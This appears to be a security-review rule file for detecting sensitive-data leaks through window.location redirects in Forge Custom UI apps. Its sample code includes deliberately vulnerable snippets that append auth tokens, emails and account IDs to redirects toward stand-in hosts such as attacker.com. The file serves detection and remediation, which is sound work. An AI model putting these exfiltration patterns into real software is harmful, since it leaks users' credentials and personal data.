---
description: Detect data egress via window.location redirects in Forge Custom UI
globs:
alwaysApply: false
---

Context

- Forge Custom UI apps can redirect users via `window.location` with sensitive data appended to URLs. No browser CSP directive currently prevents this.
- Related CWE: CWE-201 (Insertion of Sensitive Information Into Sent Data).
- Reference: Internal VULN Guide to window.location data egress.

Scope & Signals

- Location: `static/` directory in Forge apps (Custom UI iframe content).
- Redirect patterns to check:
  - `window.location = url`
  - `window.location.href = url`
  - `window.location.assign(url)`
  - `window.location.replace(url)`
  - `document.location`, `self.location`, `location` variants
- Data egress vectors:
  - Query parameters: `?userData=${sensitiveData}`
  - Subdomains: `${userData}.attacker.com`
  - Path segments: `/exfil/${userData}`

Vulnerable Patterns

```javascript
// VULNERABLE - User data in query parameters
const userData = await getUserData();
window.location = `https://external-site.com/callback?data=${userData.email}`;

// VULNERABLE - Building URL with sensitive context
const issueData = await fetchIssueDetails();
window.location.href = `https://analytics.example.com/track?issue=${issueData.key}&user=${issueData.reporter}`;

// VULNERABLE - Redirect to undeclared domain
window.location = 'https://not-in-manifest.com/page';

// VULNERABLE - Dynamic URL construction
const baseUrl = payload.redirectUrl;  // Attacker-controlled
const token = await getAuthToken();
window.location.assign(`${baseUrl}?token=${token}`);

// VULNERABLE - Data in subdomain
const userId = context.accountId;
window.location = `https://${userId}.tracking.attacker.com/`;
```

Secure Patterns

```javascript
// SECURE - Static redirect to declared domain, no sensitive params
window.location = 'https://docs.example.com/help';

// SECURE - Validate redirect URL against allowlist
const ALLOWED_REDIRECTS = [
  'https://app.example.com/callback',
  'https://auth.example.com/complete'
];

function safeRedirect(url) {
  if (!ALLOWED_REDIRECTS.includes(url)) {
    throw new Error('Invalid redirect URL');
  }
  window.location = url;
}

// SECURE - Use Forge navigation instead of raw redirect
import { router } from '@forge/bridge';

async function navigateToPage() {
  await router.navigate('/admin/settings');
}

// SECURE - No sensitive data in URL
window.location = 'https://external.example.com/page';
// Sensitive data sent via POST body instead
```

Detection Checklist

- [ ] Search `static/` directory for `window.location`, `location.href`, etc.
- [ ] Extract URL values from redirect assignments.
- [ ] Check if URLs contain template literals with variables.
- [ ] Verify redirect domains are declared in manifest permissions.
- [ ] Assess what data is included in URL parameters.
- [ ] Look for dynamic URL construction from untrusted sources.

Data Flow Analysis

```javascript
// Trace data flow to redirects:
// 1. Identify the redirect statement
window.location.href = fullUrl;

// 2. Find variable assignments
const fullUrl = base + "://" + domain + "?" + params;

// 3. Trace each component
const base = "https";  // Static - OK
const domain = "api.example.com";  // Static - OK
const params = `userId=${context.accountId}`;  // Sensitive data!

// 4. Verify domain is in manifest
// 5. Assess sensitivity of params
```

False Positive Indicators

```javascript
// Local navigation (same origin)
window.location = '/settings';
window.location.href = './page.html';

// Static URLs without parameters
window.location = 'https://help.example.com';

// Shadowed location variable (not global)
function handler() {
  const location = { href: '' };  // Local variable
  location.href = 'value';  // Not a redirect
}
```

Manifest Cross-Reference

```yaml
# Check redirects against manifest:
permissions:
  external:
    fetch:
      client:
        - 'api.example.com'
        
# Redirect to api.example.com - OK (if no sensitive data)
# Redirect to other.example.com - VIOLATION (undeclared)
```

PoC / Test Leads

- Intercept redirect and analyze URL parameters for sensitive data.
- Verify redirect domains match manifest declarations.
- Test with different user contexts to see what data is exfiltrated.
- Check network logs for outbound requests to unexpected domains.

Remediation Guidance (advisory)

- Avoid putting sensitive data in redirect URLs.
- Use POST requests for data transmission, not GET parameters.
- Implement strict allowlist for redirect destinations.
- Use Forge bridge navigation APIs when possible.
- Validate all redirect URLs against manifest-declared domains.
- Consider server-side redirects instead of client-side.

Reporting Guidance

- Document each redirect pattern with file location.
- Identify what sensitive data appears in URLs.
- Note if redirect domain is declared in manifest.
- Assess data sensitivity (PII, tokens, issue data).
- Map to CWE-201; note current lack of CSP navigate-to support.

